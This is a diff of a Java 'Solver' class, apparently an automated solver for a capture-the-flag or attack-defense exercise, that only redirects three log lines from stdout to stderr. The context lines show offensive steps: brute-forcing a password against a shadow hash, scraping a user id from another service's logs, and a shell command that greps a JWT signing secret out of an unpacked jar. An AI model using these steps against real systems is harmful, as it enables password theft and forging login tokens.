@@ -130,7 +130,7 @@ public class Solver extends Thread {
 			System.err.println(command);
 			Process proc = Runtime.getRuntime().exec(command).onExit().get();
 			String computedHash = new String(proc.getInputStream().readAllBytes()).split("\n")[0];
-			System.out.printf("Trying %s : %s%n", candidate, computedHash);
+			System.err.printf("Trying %s : %s%n", candidate, computedHash);
 			if (shadowHash.equals(computedHash)) {
 				correctPass = candidate;
 				break;
@@ -141,7 +141,7 @@ public class Solver extends Thread {
 			System.exit(1);
 			return;
 		}
-		System.out.printf("!! Password is %s%n", correctPass);
+		System.err.printf("!! Password is %s%n", correctPass);
 
 		// TODO find this out programmatically and use an ip
 		String logusHost = "logus";
@@ -151,7 +151,7 @@ public class Solver extends Thread {
 		Matcher uidMatcher = Pattern.compile(".*jwt for (?<uid>.*)\"}").matcher(logLines);
 		uidMatcher.find();
 		String uid = uidMatcher.group("uid");
-		System.out.printf("!! user id from log is %s%n", uid);
+		System.err.printf("!! user id from log is %s%n", uid);
 
 		// get jwt signing secret from authus
 		write("cd /app/ && unzip *.jar >/dev/null && grep secret BOOT-INF/classes/application.properties");
